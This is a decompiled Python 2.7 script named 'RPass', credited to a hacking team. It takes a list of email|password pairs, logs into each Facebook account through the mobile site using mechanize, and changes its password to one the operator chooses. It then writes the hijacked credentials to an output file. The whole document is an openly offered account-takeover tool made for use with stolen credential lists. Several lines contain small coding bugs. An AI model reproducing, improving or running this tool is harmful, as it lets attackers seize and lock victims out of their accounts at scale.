# uncompyle6 version 3.6.2
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <r>
try:
    import os, sys, time
    from multiprocessing.pool import ThreadPool
    import mechanize
except ImportError:
    print '\x1b[37m[\x1b[31mModuleError\x1b[37m] \x1b[34m mechanize not installed'
    sys.exit()

class reset:

    def __init__(self):
        self.u = 'https://mbasic.facebook.com/{}'
        self.banner()

    def banner(self):
        print '\x1b[37m\n    ____  ____\n   / __ \\/ __ \\____ ___________ \x1b[34mAuthor    : \x1b[32mBL4CK DR460N\x1b[37m\n  / /_/ / /_/ / __ `/ ___/ ___/ \x1b[34mName Tool : \x1b[32mRPass (Riset Password)\x1b[37m\n / _, _/ ____/ /_/ (__  |__  )  \x1b[34mMy Team   : \x1b[32mWoll Cyber Team\x1b[37m\n/_/ |_/_/    \\__,_/____/____/\n\n'
        self.main()

    def main(self):
        print '\x1b[37m[*] sparator (email|password)'
        try:
            list = raw_input('\x1b[37m[?] List Account : \x1b[32m')
            self.file = open(list, 'r').read().splitlines()
        except IOError:
            print '\x1b[31m[*] File not found'
            sys.exit()

        print '\x1b[37m[!] Password must be 6 characters or more'
        self.newpas = raw_input('\x1b[37m[?] New Password : \x1b[32m')
        if self.newpas < 6:
            print '\x1b[37m[!] Password must be 6 characters or more'
            sys.exit()
        for i in self.file:
            self.login(i)

        print '\x1b[32m[+] DONE, file save as  : \x1b[34mout/new.txt'

    def login(self, id):
        global br
        try:
            br = mechanize.Browser()
            br.set_handle_equiv(True)
            br.set_handle_gzip(True)
            br.set_handle_redirect(True)
            br.set_handle_referer(True)
            br.set_handle_robots(False)
            br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
            br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36')]
            br.open(self.u.format('/login'))
            br.select_form(nr=0)
            br.form['email'] = id.split('|')[0]
            br.form['pass'] = id.split('|')[1]
            sub = br.submit().read()
            if 'save-device' in str(sub) or 'm_sess' in str(sub):
                self.set(id)
            else:
                print ('\x1b[31m[FL] {}').format(id)
        except:
            pass

    def set(self, id):
        br.open(self.u.format('/settings/security/password/'))
        br._factory.is_html = True
        br.select_form(nr=1)
        br.form['password_old'] = id.split('|')[1]
        br.form['password_new'] = self.newpas
        br.form['password_confirm'] = self.newpas
        mit = br.submit().read()
        if 'Kata Sandi Telah Diubah' in str(mit) or 'Password Changed' in str(mit):
            try:
                os.mkdir('out')
            except:
                pass

            with open('out/new.txt', 'a') as (sv):
                sv.write('{}|{}\n').format(id.split('|')[0], self.newpas)
            print ('\x1b[37m[\x1b[32mOK\x1b[37m] \x1b[32mSUCCESS To Riset \x1b[34m{} \x1b[37m>> \x1b[32m{}|{}').format(self.id, id.split('|')[0], self.newpas)


reset()